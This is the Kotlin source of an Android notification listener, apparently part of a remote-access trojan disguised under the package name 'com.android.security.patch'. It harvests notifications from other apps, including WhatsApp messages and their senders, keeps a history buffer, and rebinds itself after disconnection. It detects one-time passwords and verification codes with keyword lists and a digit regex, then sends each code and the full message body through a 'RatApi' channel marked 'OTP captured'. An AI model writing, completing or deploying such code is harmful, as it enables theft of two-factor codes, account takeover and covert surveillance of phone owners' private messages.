package com.android.security.patch

import android.app.Notification
import android.content.Context
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.android.security.patch.Pager.Item
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentLinkedDeque

class NotifListener : NotificationListenerService() {

    companion object {
        @Volatile var alive = false
        @Volatile var instance: NotifListener? = null

        private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

        private val OTP_WORDS = listOf(
            "otp", "kode", "code", "verifikasi", "verify", "verification",
            "kode otp", "one time", "one-time", "2fa", "auth", "login code",
            "token", "pin"
        )
        private val OTP_REGEX = Regex("""\b(\d{4,8})\b""")

        data class Rec(
            val pkg: String,
            val title: String,
            val body: String,
            val ts: Long
        )

        // buffer buat history
        private val buffer = ConcurrentLinkedDeque<Rec>()
        private const val MAX = 500

        fun clearNotifs() { buffer.clear() }
        fun historySize() = buffer.size

        /** live=true → realtime dari status bar. live=false → history buffer */
        fun drainNotifs(filter: String, live: Boolean): List<Item> {
            val fmt = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
            val source: List<Rec> = if (live) {
                val svc = instance
                val out = mutableListOf<Rec>()
                if (svc != null && alive) {
                    try {
                        svc.activeNotifications?.forEach { sbn ->
                            try { parseActive(sbn)?.let { out.add(it) } } catch (_: Throwable) {}
                        }
                    } catch (_: Throwable) {}
                }
                out
            } else {
                buffer.toList().reversed()
            }

            val key = filter.lowercase().trim()
            val filtered = when (key) {
                "", "all" -> source
                "wa", "whatsapp" -> source.filter { it.pkg == "com.whatsapp" || it.pkg.startsWith("com.whatsapp") }
                "wa_biz", "wab", "wb", "wabisnis" -> source.filter { it.pkg == "com.whatsapp.w4b" || it.pkg.contains("w4b") }
                "wa_all", "waall" -> source.filter { it.pkg.contains("whatsapp") }
                else -> source.filter {
                    it.pkg.contains(key, ignoreCase = true) ||
                    it.title.lowercase().contains(key) ||
                    it.body.lowercase().contains(key)
                }
            }
            return filtered.sortedByDescending { it.ts }.take(200).map {
                Item("[${fmt.format(Date(it.ts))}] ${it.title} — ${it.body.take(140)}", it.pkg)
            }
        }

        private fun parseActive(sbn: StatusBarNotification): Rec? {
            val pkg = sbn.packageName ?: return null
            val n = sbn.notification ?: return null
            val extras = n.extras ?: return null

            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString().orEmpty()
                .ifBlank { extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString().orEmpty() }

            val messagesBuilder = StringBuilder()
            try {
                val msgs = extras.getParcelableArray(Notification.EXTRA_MESSAGES)
                if (msgs != null) for (m in msgs) {
                    if (m is Bundle) {
                        val who = m.getCharSequence("sender")?.toString().orEmpty()
                        val txt = m.getCharSequence("text")?.toString().orEmpty()
                        if (txt.isNotBlank()) messagesBuilder.append(if (who.isNotBlank()) "$who: " else "").append(txt).append("\n")
                    }
                }
            } catch (_: Throwable) {}

            val linesBuilder = StringBuilder()
            try {
                val lines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
                if (lines != null) for (l in lines) if (!l.isNullOrBlank()) linesBuilder.append(l).append("\n")
            } catch (_: Throwable) {}

            val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString().orEmpty()
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString().orEmpty()
            val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString().orEmpty()

            var body = when {
                messagesBuilder.isNotBlank() -> messagesBuilder.toString().trim()
                linesBuilder.isNotBlank() -> linesBuilder.toString().trim()
                bigText.isNotBlank() -> bigText
                text.isNotBlank() -> text
                else -> ""
            }
            if (subText.isNotBlank() && !body.contains(subText)) body = "$subText | $body"

            val ts = sbn.postTime.takeIf { it > 0 } ?: System.currentTimeMillis()
            return Rec(pkg, title, body, ts)
        }

        private fun add(pkg: String, title: String, body: String, ts: Long) {
            buffer.addFirst(Rec(pkg, title, body, ts))
            while (buffer.size > MAX) buffer.pollLast()
        }

        private fun checkOtp(ctx: Context, pkg: String, title: String, body: String) {
            val lower = (title + " " + body).lowercase()
            val isOtp = OTP_WORDS.any { lower.contains(it) }
            val hasDigits = OTP_REGEX.containsMatchIn(body)
            if (isOtp && hasDigits) {
                val code = OTP_REGEX.find(body)?.value ?: ""
                scope.launch {
                    RatApi.sendMessage(
                        ctx,
                        "<b>OTP captured</b>\nApp: <code>$pkg</code>\nTitle: $title\nBody: $body\nCode: <b>$code</b>"
                    )
                }
            }
        }
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        alive = true
        instance = this
        try {
            activeNotifications?.forEach { sbn ->
                try {
                    val rec = parseActive(sbn) ?: return@forEach
                    add(rec.pkg, rec.title, rec.body, rec.ts)
                } catch (_: Throwable) {}
            }
        } catch (_: Throwable) {}
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        alive = false
        instance = null
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            requestRebind(android.content.ComponentName(this, NotifListener::class.java))
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        try {
            val rec = parseActive(sbn) ?: return
            if (rec.pkg == packageName || rec.pkg == "android" || rec.pkg == "com.android.systemui") return
            add(rec.pkg, rec.title, rec.body, rec.ts)
            checkOtp(this, rec.pkg, rec.title, rec.body)
        } catch (_: Throwable) {}
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}
}
